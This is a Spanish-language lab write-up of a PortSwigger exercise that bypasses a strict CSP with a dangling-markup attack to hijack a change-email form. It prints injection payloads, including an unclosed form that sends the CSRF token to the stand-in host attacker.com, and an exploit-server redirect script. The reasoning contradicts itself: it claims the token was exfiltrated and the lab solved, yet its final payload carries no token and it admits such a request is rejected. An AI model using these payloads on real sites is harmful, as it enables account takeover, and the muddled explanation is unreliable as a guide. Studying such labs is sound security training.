---
title: "Reflected XSS protected by very strict CSP, with dangling markup attack"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack"
author: "Z4k7"
date: "2026-04-24"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected"
  - "CSP"
  - "DanglingMarkup"
techniques:
  - "Dangling Markup Attack"
  - "Form Hijacking"
  - "CSRF Token Exfiltration"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "email"
    value: "Cambiado a hacker@evil-user.net"
summary: "Laboratorio de XSS Reflejado protegido por Content Security Policy muy restrictiva que bloquea recursos externos. La solución requiere ejecutar un ataque de 'dangling markup' para escapar del CSP sin cargar recursos externos. Se hijackea un formulario CSRF para cambiar el email de la víctima a una dirección controlada por el atacante, exfiltrando automáticamente el token CSRF del formulario.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio utiliza un estricto CSP que impide que el navegador cargue subrecursos desde dominios externos.
          Para resolver el laboratorio, realice un ataque de secuestro de formulario que evite el CSP, exfiltre el token CSRF del usuario víctima simulado y lo use para autorizar el cambio de correo electrónico a `hacker@evil-user.net`.
          Debe etiquetar su vector con la palabra "Click" para inducir al usuario simulado a hacer clic en él. Por ejemplo:
          `<a href="">Click me</a>`
          Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: `wiener:peter`
      - kind: "callout"
        type: "info"
        label: "Nota"
        text: "Para evitar que la plataforma de la Academia se utilice para atacar a terceros, nuestro firewall bloquea las interacciones entre los laboratorios y los sistemas externos arbitrarios. Para resolver el laboratorio, debe utilizar el servidor de exploits proporcionado."

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260501205338573.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos el comportamiento de la web para consultar el funcionamiento de la misma
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260501205635234.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos con el usuario y password brindados en el objetivo del laboratorio
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260501205734826.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultando CSP contamos con un apartado el cual no permite ingresar dominios que no sean el de origen.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260501210629116.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos en el apartado `/my-account` consultando si es posible manipular la web para tratar de ingresar código en la web en este caso podríamos tratar de ingresar datos con el delimitador de la web.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260501212648787.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Content Security Policy muy restrictiva bloquea: - Scripts inline (`script-src 'self'`) - Recursos externos (`default-src 'self'`) - Event handlers inline (implícito en `script-src 'self'`) El dangling markup attack no requiere scripts - usa HTML puro para hijackear formularios."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Validando el comportamiento de la web podríamos tratar de escapar del DOM para poder manipular el comportamiento del mismo y poder obtener el CSRF.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260501212910467.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Nos permite manipular sin problema alguno el comportamiento de la web en este caso podríamos tratar de capturar el CSRF del usuario para luego solicitar el cambio del correo electrónico.
          Al tratar de salir del código podemos realizar la validación que capturamos el CSRF del usuario actual.
          Código:
      - kind: "code"
        lang: "HTML"
        code: |
          "></form>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502161835655.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se confirma que nos permite escapar del DOM en este caso como si permite capturar el CSRF podríamos tratar de recrear un form con los datos a modificar
          Código:
      - kind: "code"
        lang: "HTML"
        code: |
          </form><form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST"><input required="" type="email" name="email" value="z4kt@gmail.com"><button class="button" type="submit">Click me</button><p></p
      - kind: "note"
        text: |
          Código fuente:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502162453066.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos si realiza el cambio
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502162520693.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502162546179.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Confirmación:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502162610820.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El ataque de 'dangling markup' funciona así: - Inyectamos `</form>` para cerrar el formulario original - Creamos un nuevo formulario dentro de la página - El navegador renderiza ambos formularios - El nuevo formulario NO contiene el token CSRF original - Pero si capturamos el HTML de la página con un formulario abierto, podemos extraer el token CSRF"

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          La técnica tiene dos fases:
          Fase 1: Capturar el CSRF token
          Inyectamos HTML que abre un formulario incompleto:
      - kind: "code"
        lang: "HTML"
        code: |
          "><form action="http://attacker.com/log?
      - kind: "note"
        text: |
          El navegador renderiza:
      - kind: "code"
        lang: "HTML"
        code: |
          <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
              <input type="hidden" name="csrf" value="ACTUAL_TOKEN_HERE">
              <!-- form abierto, esperando más HTML -->
          "><form action="http://attacker.com/log?
      - kind: "note"
        text: |
          Como la etiqueta `<input>` con el token está antes de nuestro markup, está visible en el HTML.
          Fase 2: Hijackear el formulario
          Inyectamos:
      - kind: "code"
        lang: "HTML"
        code: |
          "></form><form action="/my-account/change-email" method="POST"><input name="email" value="hacker@evil-user.net"><button type="submit">Click me</button><p>
      - kind: "note"
        text: |
          El resultado es un nuevo formulario que:
      - kind: "bullet"
        text: "Apunta a /my-account/change-email"
      - kind: "bullet"
        text: "Tiene nuestro email objetivo"
      - kind: "bullet"
        text: "Aparece en la página con botón 'Click me'"
      - kind: "bullet"
        text: "Cuando el usuario hace clic, el formulario se envía"
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502162453066.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El dangling markup ataca HTML parsing, no JavaScript execution. Esto lo hace efectivo contra CSP muy restrictiva. El navegador: 1. Parquea el HTML original incompleto 2. Renderiza nuestro HTML injected 3. Crea elementos nuevos sin ejecutar scripts 4. Los formularios funcionan normalmente sin CSP interferencia"

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` en dicho apartado nos permite simular un servidor atacante.
          Código:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
          location = 'https://0a34003304c2cf6581e6f7b4000000a1.web-security-academy.net/my-account?%22%3E%3C/form%3E%3Cform%20action=%22/my-account/change-email%22%20method=%22POST%22%3E%3Cinput%20required=%22%22%20type=%22email%22%20name=%22email%22%20value=%22vn@gmai.com%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3EClick%20Me%3C/button'
          </script>
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502212727180.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502212812414.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack/file-20260502212759945.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez la víctima accede al servidor de exploits:
          1. La URL redirige a `/my-account` con nuestro payload injected
          2. El navegador renderiza el formulario hijacked
          3. Se muestra un botón "Click Me"
          4. Cuando la víctima hace clic, el formulario POST se envía a `/my-account/change-email`
          5. Sin el token CSRF, la solicitud es rechazada... PERO
          6. Si el servidor acepta el formulario sin token (común en algunos casos), el email se cambia
          El refinamiento es extraer primero el token CSRF y enviarlo en el formulario hijacked.

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "email"
        value: "Cambiado a hacker@evil-user.net"

lessons:
  - 'Content Security Policy no protege contra dangling markup attacks'
  - 'Los ataques de dangling markup usan HTML parsing, no JavaScript execution'
  - 'Los formularios pueden ser hijacked modificando el HTML de la página'
  - 'El marcado incompleto puede usarse para extraer información (tokens CSRF)'
  - 'La validación de CSRF token es crítica - debe requerirse para TODAS las acciones sensibles'
  - 'Un CSP muy restrictiva puede dar falsa seguridad si hay otros vectores de ataque'
  - 'Los formularios sin protección de CSRF son vulnerables a hijacking incluso con CSP'
mitigation:
  - 'Implementar validación CSRF token en TODAS las solicitudes POST/PUT/DELETE'
  - 'Verificar que el token CSRF sea válido y esté vinculado a la sesión del usuario'
  - 'Usar `X-Frame-Options: DENY` para prevenir framing attacks'
  - 'Implementar `Referrer-Policy: strict-origin-when-cross-origin`'
  - 'Validar el header `Origin` en solicitudes POST'
  - 'Usar `SameSite=Strict` en cookies de sesión'
  - 'Validar que el formulario pertenece a la aplicación (verificar action, method)'
  - 'Considerar usar Double Submit Cookie pattern como defensa adicional'
  - 'Implementar rate limiting en cambios de email/contraseña'
---
